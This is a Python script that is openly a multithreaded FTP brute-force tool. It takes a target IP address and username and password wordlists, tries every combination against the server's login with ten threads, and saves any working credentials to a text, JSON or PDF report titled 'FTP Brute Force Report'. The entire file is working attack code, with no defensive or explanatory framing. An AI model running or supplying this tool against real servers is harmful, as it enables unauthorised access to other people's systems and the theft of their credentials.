import ftplib
import threading
import queue
from tqdm import tqdm
import os
import json
from fpdf import FPDF
import requests
import socket

# ANSI escape sequences for colors
GREEN = '\033[92m'  # Green text
RED = '\033[91m'   # Red text
RESET = '\033[0m'  # Reset to default terminal color

# Thread-safe progress update
progress_lock = threading.Lock()

def update_progress(progress_bar):
    progress_lock.acquire()
    try:
        progress_bar.update(1)
    finally:
        progress_lock.release()

def attempt_login(host, username, password, result_queue, progress_bar):
    try:
        with ftplib.FTP(host, timeout=10) as ftp:
            ftp.login(username, password)
            result_queue.put((username, password))
            tqdm.write(f"{GREEN}Success: {username}:{password}{RESET}")
    except ftplib.error_perm as e:
        tqdm.write(f"{RED}Failed: {username}:{password} - Permission Error{RESET}")
    except socket.error as e:
        tqdm.write(f"{RED}Connection error with {username}:{password} - {str(e)}{RESET}")
    except Exception as e:
        tqdm.write(f"{RED}Error with {username}:{password} - {str(e)}{RESET}")
    finally:
        update_progress(progress_bar)

def worker(host, credentials_queue, result_queue, progress_bar):
    while not credentials_queue.empty():
        username, password = credentials_queue.get()
        attempt_login(host, username, password, result_queue, progress_bar)
        credentials_queue.task_done()

def save_report(data, file_format, file_name, directory_path):
    """Generate a report from fetched data and save it to a specific location in the chosen format."""
    file_path = os.path.join(directory_path, file_name + '.' + file_format)
    os.makedirs(directory_path, exist_ok=True)

    if file_format == 'json':
        with open(file_path, 'w') as file:
            json.dump(data, file, indent=4)
    elif file_format == 'txt':
        with open(file_path, 'w') as file:
            for entry in data:
                file.write(f"Username: {entry[0]}, Password: {entry[1]}\n")
    elif file_format == 'pdf':
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", size=12)
        pdf.set_fill_color(224, 235, 255)
        pdf.cell(0, 10, 'FTP Brute Force Report', 0, 1, 'C', 1)
        
        # Column titles
        pdf.set_fill_color(192, 192, 192)  # Light gray fill
        pdf.cell(90, 10, 'Username', 1, 0, 'C', 1)
        pdf.cell(90, 10, 'Password', 1, 1, 'C', 1)

        # Reset font for data
        pdf.set_font("Arial", size=10)
        pdf.set_fill_color(255, 255, 255)  # White fill for data

        for entry in data:
            username = entry[0]
            password = entry[1]
            # Check if content needs to wrap to the next line
            pdf.multi_cell(90, 10, username, 1, 'L', 1)
            pdf.set_y(pdf.get_y() - 10)  # Move back up to right next to the username cell if it wrapped
            pdf.set_x(100)  # Move right to where the password cell starts
            pdf.multi_cell(90, 10, password, 1, 'L', 1)

        pdf.output(file_path)

        
def run_bruteforce_ftp():
    host = input("Enter the target FTP IP address: ")
    username_file = input("Enter the path to the username wordlist: ")
    password_file = input("Enter the path to the password wordlist: ")

    try:
        def load_list(file_path):
            with open(file_path, 'r') as file:
                return [line.strip() for line in file]

        username_list = load_list(username_file)
        password_list = load_list(password_file)

        credentials_queue = queue.Queue()
        total_attempts = len(username_list) * len(password_list)
        for username in username_list:
            for password in password_list:
                credentials_queue.put((username.strip(), password.strip()))

        result_queue = queue.Queue()

        progress_bar = tqdm(total=total_attempts, desc="Brute Forcing", unit="login")

        threads = []
        num_threads = 10

        for _ in range(num_threads):
            thread = threading.Thread(target=worker, args=(host, credentials_queue, result_queue, progress_bar))
            thread.start()
            threads.append(thread)

        credentials_queue.join()

        for thread in threads:
            thread.join()

        progress_bar.close()

        successful_logins = list(result_queue.queue)

        if successful_logins:
            print(f"{GREEN}FTP credentials found: {len(successful_logins)} successful logins{RESET}")
        else:
            print("No valid FTP credentials found.")

        # Save report
        file_format = input("Enter the file format (txt, json, pdf): ").lower()
        if file_format not in ['txt', 'json', 'pdf']:
            print("Invalid format selected. Defaulting to txt.")
            file_format = 'txt'
        file_name = input("Enter the filename without extension: ")
        directory_path = input("Enter the directory path where you want to save the file: ")
        save_report(successful_logins, file_format, file_name, directory_path)

    except FileNotFoundError:
        print("File not found. Check the file path and try again.")
    except Exception as e:
        print(f"An error occurred: {str(e)}")

